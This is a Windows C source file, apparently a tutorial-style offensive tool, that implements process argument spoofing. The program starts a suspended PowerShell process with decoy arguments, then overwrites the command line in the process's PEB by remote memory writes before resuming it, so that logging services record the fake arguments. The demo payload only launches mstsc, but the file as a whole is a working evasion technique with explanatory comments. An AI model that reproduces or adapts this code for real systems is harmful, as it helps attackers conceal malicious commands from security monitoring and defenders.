/*
Explaination:
- Process argument spoofing is a technique used to conceal the command line argument of a newly spawned process in order to facilitate the execution of commands without revealing them to logging services.
- Inside the PEB structure (holds process information), the RTL_USER_PROCESS_PARAMETER structure contains the CommandLine member which hols the command line arguments.
- The buffer element will contain the contents of the command line arguments. In order to access this elemenet > PEB->ProcessParameters.CommandLine.Buffer
*/

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <tlhelp32.h>
#pragma warning (disable:4996)


// Define the startup and real arguments
#define STARTUP_ARGS L"powershell.exe 0xBinarySl3uth Is Present"
#define REAL_ARGS    L"powershell.exe -c mstsc.exe"

BOOL TermProcess(const WCHAR* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    while (Process32Next(hSnapshot, &pe32)) {
        if (wcsicmp(pe32.szExeFile, processName) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                CloseHandle(hSnapshot);
                return TRUE;
            }
        }
    }

    CloseHandle(hSnapshot);
    return FALSE;
}

// Function that allocates memory and reads from the target process
BOOL ReadTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {
    SIZE_T sNumberOfBytesRead = NULL;

    // Function: Allocated Memory for the PEB structure
    // First Parameter -> Handle to the heap which the memory will be allocated, this handle is returned by GetProcessHeap()
    // Second Parameter -> Allocated memory will be initialized with 0's
    // Third Parameter -> Number of Bytes Allocated, size of PEB structure
    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
    if (*ppReadBuffer == NULL) {
        printf("[!] HeapAlloc Failed with Error Code: %d \n", GetLastError());
        return FALSE;
    }

    // Function: Reads Remote Process in order to get the remote process PEB structure
    // First Parameter -> Handle to the remote process to be read
    // Second Parameter -> Base Address of the remote process
    // Third Parameter -> Pointer that receives the PEB structure
    // Fourth Parameter -> Pointer that receives the number of bytes transfferred
    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNumberOfBytesRead) || sNumberOfBytesRead != dwBufferSize) {
        printf("[!] ReadProcessMemory Failed With Error Code: %d \n", GetLastError());
        printf("[+] Bytes Read %zu of %d \n", sNumberOfBytesRead, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}

// Function that writes to the target process
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddress2WriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {
    SIZE_T sNumberOfBytesWritten = 0;

    // Function Writes To Remote Process
    // First Parameter -> Handle to remote process that needs to be modified
    // Second Parameter -> Pointer to target address of the remote process memory
    // Third Parameter -> Pointer to the buffer that contains the data
    // Fourth Parameter -> Size in bytes
    // Fifth Parameter -> Recives the number of written bytes
    if (!WriteProcessMemory(hProcess, pAddress2WriteTo, pBuffer, dwBufferSize, &sNumberOfBytesWritten)) {
        printf("[!] WriteProcessMemory Failed With Error Code: %d \n", GetLastError());
        printf("[+] Bytes Written: %zu of %d \n", sNumberOfBytesWritten, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}

// Initialize NtQueryInformationProcess
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );

// Function to perform argument spoofing
BOOL ArgumentSpoofingProcess(IN LPWSTR szStartupArguments, IN LPWSTR szRealArguments, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    NTSTATUS                      STATUS = NULL;
    WCHAR                         szProcess[MAX_PATH];
    STARTUPINFOW                  Si = { 0 };
    PROCESS_INFORMATION           Pi = { 0 };
    PROCESS_BASIC_INFORMATION     PBI = { 0 };
    ULONG                         uRetern = NULL;
    PPEB                          pPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS  pParms = NULL;

    // Initialize memory
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Determine the size of STARTUPINFO
    Si.cb = sizeof(STARTUPINFOW);

    // Function pointer for NtQueryInformationProcess
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
        printf("[!] pNtQueryInformationProcess Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    // Copy fake arguments into the command line buffer
    lstrcpynW(szProcess, szStartupArguments, MAX_PATH);

    // Printing the fake arguments
    wprintf(L"\t[+] Running : \"%s\" ... \n", szProcess);
    
    // Creating Process with the supplied commandline arguments (fake one)
    if (!CreateProcessW(NULL, szProcess, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32\\", &Si, &Pi)) {
        printf("[!] CreateProcessW Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    printf("[+] Successfully Created Process!\n");
    printf("\t[+] Target Process Created With Pid: %d \n", Pi.dwProcessId);

    // Getting PROCESS_BASIC_INFORMATION structure from the remote process
    // First Parameter -> Handle to the remote process
    // Second Parameter -> Retrieves based information about the remote process
    // Third Parameter -> Retrieves the strutcure of the remote process
    // Fifth Parameter -> Size in bytes of the structure
    if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
        printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // Reading the `peb` structure from its base address in the remote process
    if (!ReadTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
        printf("\t[!] Failed To Read Target's Process Peb \n");
        return FALSE;
    }
    printf("[+] Peb Base Address: 0x%p \n", PBI.PebBaseAddress);

    // Reading the `ProcessParameters` structure from the PEB of the remote process
    // We read extra `0xFF` bytes to ensure we have reached the CommandLine.Buffer pointer
    if (!ReadTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
        printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
        return FALSE;
    }

    // Writing the parameter we want to run
    wprintf(L"\t[+] Writing \"%s\" As The Process Argument At : 0x%p  \n", szRealArguments, pParms->CommandLine.Buffer);
    if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArguments, (DWORD)(lstrlenW(szRealArguments) * sizeof(WCHAR) + 1))) {
        printf("\t[!] Failed To Write The Real Parameters\n");
        return FALSE;
    }
    printf("[+] Writing To Remote Process ... \n");

    // Clean up Heap
    HeapFree(GetProcessHeap(), NULL, pPeb);
    HeapFree(GetProcessHeap(), NULL, pParms);

    // Resume the suspended thread
    ResumeThread(Pi.hThread);

    // Saving Output Parameters
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL) {
        return TRUE;
    }
    return FALSE;
}

int main() {
    HANDLE hProcess = NULL, hThread = NULL;
    DWORD dwProcessId = NULL;

    wprintf(L"[+] Target Process Created With Startup Arguments: \"%s\" \n", STARTUP_ARGS);
    wprintf(L"[+] Actual Arguments REAL_ARGS:  \"%s\" \n", REAL_ARGS);

    if (!ArgumentSpoofingProcess(STARTUP_ARGS, REAL_ARGS, &dwProcessId, &hProcess, &hThread)) {
        return -1;
    }

    printf("[+] Press <Enter> To Exit \n");
    getchar();
    TermProcess(L"mstsc.exe");
    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}
